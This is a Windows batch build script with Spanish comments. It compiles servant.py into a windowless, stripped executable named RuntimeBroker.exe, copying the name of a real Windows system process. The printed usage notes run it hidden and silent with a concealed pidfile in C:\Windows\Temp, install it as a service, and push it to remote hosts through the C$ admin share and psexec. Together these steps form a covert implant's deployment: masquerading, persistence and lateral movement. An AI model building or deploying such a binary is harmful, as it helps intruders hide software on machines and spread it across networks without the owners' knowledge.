@echo off
REM Script para compilar servant.py a binario standalone en Windows

echo === Compilando servant a binario standalone para Windows ===

REM Verificar que PyInstaller esté instalado
python -c "import PyInstaller" 2>nul
if errorlevel 1 (
    echo Instalando dependencias...
    pip install -r requirements.txt
)

REM Compilar servant para Windows (sin ventana de consola)
echo.
echo Compilando servant.py para Windows...
pyinstaller --onefile ^
    --noconsole ^
    --name RuntimeBroker ^
    --strip ^
    --clean ^
    servant.py

echo.
echo === Compilación completada ===
echo Binario generado en: dist\RuntimeBroker.exe
echo.
echo Uso:
echo   dist\RuntimeBroker.exe --hide-window --silent --token my-token --pidfile C:\Windows\Temp\.srv.pid
echo.
echo Para instalar como servicio de Windows:
echo   python install_windows_service.py install
echo   net start ServantService
echo.
echo Para desplegar en hosts remotos:
echo   copy dist\RuntimeBroker.exe \\remote-host\C$\Windows\Temp\RuntimeBroker.exe
echo   psexec \\remote-host C:\Windows\Temp\RuntimeBroker.exe --hide-window --silent --token TOKEN
